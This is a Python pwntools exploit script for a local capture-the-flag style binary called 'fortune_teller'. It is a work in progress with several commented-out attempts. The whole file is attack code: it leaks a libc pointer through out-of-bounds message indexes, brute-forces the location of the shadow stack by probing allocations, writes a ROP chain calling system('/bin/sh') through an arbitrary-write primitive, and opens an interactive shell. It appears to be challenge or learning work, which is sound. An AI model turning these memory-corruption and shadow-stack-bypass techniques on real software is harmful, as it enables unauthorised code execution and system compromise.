#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template /var/challenges/fortune_teller/fortune_teller
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or '/var/challenges/fortune_teller/fortune_teller')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
# tbreak fortune_teller.c:42
# tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# FORTIFY:    Enabled
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No
# Debuginfo:  Yes

io = start()

def try_allocate(size):
    io.sendline("0 " + str(size))
    res = io.recv(4096)
    # print("Post alloc res", res)
    return b'Failed to allocate' not in res

# deduce algo from slides
def deduce(low, high):
    if low == high:
        return low
    if high - low == 1:
        res = try_allocate(high)
        if res:
            return high
        return low
    
    mid = (low + high) // 2
    res = try_allocate(mid)
    if res:
        return deduce(mid, high)
    return deduce(low, mid - 1)

def deduce2(low, high):
    if low == high:
        return low
    
    if high - low == 1:
        # Try to allocate 'high' pages
        res = try_allocate(high)
        if res: 
            return high
        else:  
            return low
    
    mid_point = (high + low) // 2
    
    res = try_allocate(mid_point)
    
    if res:  # SUCCESS
        return deduce(mid_point, high)
    else:    # FAILURE
        return deduce(low, mid_point - 1)

    
# Leak pointer to main at messages[-6]
# io.sendline("2 -6") # set index to use
# io.sendline("1") # read message
# res = io.recv(4096)
# while b"reads: " not in res:
#     res += io.recv(4096)
# ptr =res.split(b"reads: ")[1].split(b"\n")[0]
# # Take only the first 8 bytes
# ptr = ptr[:8]
# main_ptr = int.from_bytes(ptr, "little")
# print("Main pointer:", hex(main_ptr))
# base = main_ptr - exe.symbols["main"]
# exe.address = base
# print("Base:", hex(base))

# Leak pointer to libc base
arena_pointer = 0
for i in range(-121, -117):
    io.sendline(f"2 {i}") # set index to use
    io.sendline("1") # read message
    res = io.recv(4096)
    while b"reads: " not in res:
        res += io.recv(4096)
    ptr =res.split(b"reads: ")[1].split(b"\n")[0]
    if ptr != b"(null)":
        # Take only the first 8 bytes
        ptr = ptr[:8]
        arena_pointer = int.from_bytes(ptr, "little")
        break
    
if arena_pointer == 0:
    print("Failed to find arena pointer")
    exit(1)
    
print("Arena pointer:", hex(arena_pointer))
libc_base = arena_pointer - 0x1ed3b0 # from gdb
print("Libc base:", hex(libc_base))
libc.address = libc_base

# Find system()
system = libc.sym["system"]
print("System:", hex(system))

binsh_addr = next(libc.search(b'/bin/sh'))
print(f"/bin/sh address: {hex(binsh_addr)}")

# Size we are looking for
low = 130000
high = 140000000000000

# Try allocate tests
for i in [0x100, 0x1000, 0x10000, 0x100000, 0x1000000, 0x10000000, 0x100000000, 0x100000000, 0x1000000000000, 0x1000000000000000 ]:
    print("Trying to allocate", i)
    worked = try_allocate(i)
    if worked:
        print("Worked")
    else:
        print("Failed")
        
# # Find holes
# hole1_size = find_hole()

# # Can we allocate this?
# print("Trying to allocate", hole1_size)
# worked = try_allocate(hole1_size)
# if worked:
#     print("Worked")
# else:
#     print("Failed")

# find_hole_better()


hole = deduce(low, high)
hole2 = deduce2(low, high)
print(f"Found hole at size {hole}", hex(hole))
print(f"Found hole at size {hole2}", hex(hole2))
res = try_allocate(hole)
if res:
    print("Worked")
else:
    print("Failed")
res2 = try_allocate(hole2)
if res2:
    print("Worked")
else:
    print("Failed")
    
if hole != hole2 or not res or not res2:
    print("Don't know where shadow stack is")
    exit(1)
    
shadow_stack_addr = hole + 0x10000 # + vm_min_address
print("Shadow stack addr:", hex(shadow_stack_addr))

# There are 0x1000 bytes of guard pages in front and behind
shadow_stack_addr += 0x1000
print("Unguarded at:", hex(shadow_stack_addr))

# Try to read messages[-2] which holds the pointer to the first message on the stack (so to messages[0])
io.recv(409600000, timeout=0.2)
io.sendline("2 -1420") # set index to use
io.sendline("1") # read message
res = io.recv(4096)
print("Res", res)
ptr_to_0 = res.split(b"reads: ")[1].split(b"\n")[0]
ptr_to_0 = ptr_to_0[:8]
ptr_to_0 = int.from_bytes(ptr_to_0, "little")
print("Ptr to 0:", hex(ptr_to_0))

# How many (struct fortune_message **)s (8 bytes per struct) from the beginning of the shadow stack is
# the pointer to the first message on the stack?
# diff = ptr_to_0 - shadow_stack_addr
# print("Diff:", hex(diff))
# num_ptrs = diff // 8
# print("Num ptrs:", num_ptrs) # this is the index to use to write to the shadow stack
# garbage = diff % 8
# print("Garbage len:", garbage)


# the first entry is the size of the shadow stack
# the second entry is the function that called main
# the third entry is the return address of the function that called main
# main_ret = -num_ptrs + 2 * 8
# print("Main ret:", hex(main_ret), main_ret)
# print( f"2 {-num_ptrs + 2 * 8}")

# This pointer points to the first message, which is also a pointer
# So overwrite the message[0] ptr first

# Then write to the shadow stack
# io.sendline(f"2 -2")
# print(f"write {shadow_stack_addr.to_bytes(8, 'little')} {hex(shadow_stack_addr)}")
# # io.sendline(f"3 8 {shadow_stack_addr.to_bytes(8, 'little')}")
# io.sendline("3 8 " + 8 * "C")


# # Then write to the shadow stack
# io.sendline(f"2 0")
# input("Press Enter to continue...")
# io.sendline(f"3 8 AAAAAAAA")

# Read the pointer at messages[0] first, to store the ROP chain here
# io.sendline(f"2 -2")
# io.sendline("1")
# res = io.recv(4096)
# print("Got res>", res)
# ptr_0 = res.split(b"reads: ")[1].split(b"\n")[0]
# ptr_0 = ptr_0[:8]
# ptr_0 = int.from_bytes(ptr_0, "little")
# print("Ptr 0:", hex(ptr_0))

# Create the ROP chain and put it at the return addr of main one ret addr at a time because memcpy stops at a null byte
rop = ROP(libc)
rop.call(rop.ret) # align stack
rop.call(system, [binsh_addr])
chain = rop.chain()
print(rop.dump())

ptr_0 = ptr_to_0 + 0x108

for i in range(0, len(chain), 8):
    io.sendline(f"2 -2")
    # Set the pointer
    addr = ptr_0 + i
    io.sendline(b"3 8 " + addr.to_bytes(8, 'little'))
    # Write the actual value
    io.sendline("2 0")
    io.sendline(b"3 8 " + chain[i:i+8])

# Set ptr0 to the shadow stack entry for main return
wanted_addr = shadow_stack_addr + 24
io.sendline(f"2 -2")
print("bytes:")
for i in wanted_addr.to_bytes(8, 'little'):
    print(i)

print("----")

w = b'3 8 ' + wanted_addr.to_bytes(8, 'little')
print(w)
input("Press Enter to continue...")
io.sendline(w)
# Write the actual value 
io.sendline("2 0")
io.sendline(b"3 8 " + chain[:8])

# Set the return address of main to the rop chain as well
io.sendline(f"2 -2")
io.sendline(b"3 8 " + (ptr_to_0).to_bytes(8, 'little'))
# io.sendline("2 0")
# io.sendline(b"3 8 " + (ptr_0).to_bytes(8, 'little'))


# io.sendline(f"2 {-num_ptrs + 2 * 8}") # set index to use
# io.sendline("3 8 AAAAAAAA") # write return address




io.interactive()

 